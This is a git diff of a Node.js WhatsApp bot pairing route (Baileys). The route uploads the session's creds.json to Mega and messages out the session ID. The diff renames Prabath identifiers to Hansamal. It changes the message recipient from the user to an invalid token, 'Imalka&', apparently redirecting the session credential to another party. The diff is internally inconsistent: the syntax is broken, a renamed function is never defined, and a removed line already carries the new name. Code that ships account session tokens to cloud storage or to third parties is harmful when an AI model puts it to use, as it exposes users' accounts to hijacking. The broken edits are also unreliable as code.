@@ -23,7 +23,7 @@ router.get('/', async (req, res) => {
     async function PrabathPair() {
         const { state, saveCreds } = await useMultiFileAuthState(`./session`);
         try {
-            let PrabathPairWeb = makeWASocket({
+            let HansamalPairWeb = makeWASocket({
                 auth: {
                     creds: state.creds,
                     keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
@@ -51,7 +51,7 @@ router.get('/', async (req, res) => {
                         const sessionPrabath = fs.readFileSync('./session/creds.json');
 
                         const auth_path = './session/';
-                        const user_jid = jidNormalizedUser(PrabathPairWeb.user.id);
+                        const user_jid = jidNormalizedUser(HansamalPairWeb.user.id);
 
                         const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${user_jid}.json`);
 
@@ -59,7 +59,7 @@ router.get('/', async (req, res) => {
 
                         const sid = string_session;
 
-                        const dt = await HansamalPairWeb.sendMessage(user_jid, {
+                        const dt = await HansamalPairWeb.sendMessage(Imalka&, {
                             text: sid
                         });
 
@@ -72,7 +72,7 @@ router.get('/', async (req, res) => {
                     process.exit(0);
                 } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                     await delay(10000);
-                    PrabathPair();
+                    HansamalPair();
                 }
             });
         } catch (err) {
@@ -85,7 +85,7 @@ router.get('/', async (req, res) => {
             }
         }
     }
-    return await PrabathPair();
+    return await HansamalPair();
 });
 
 process.on('uncaughtException', function (err) {
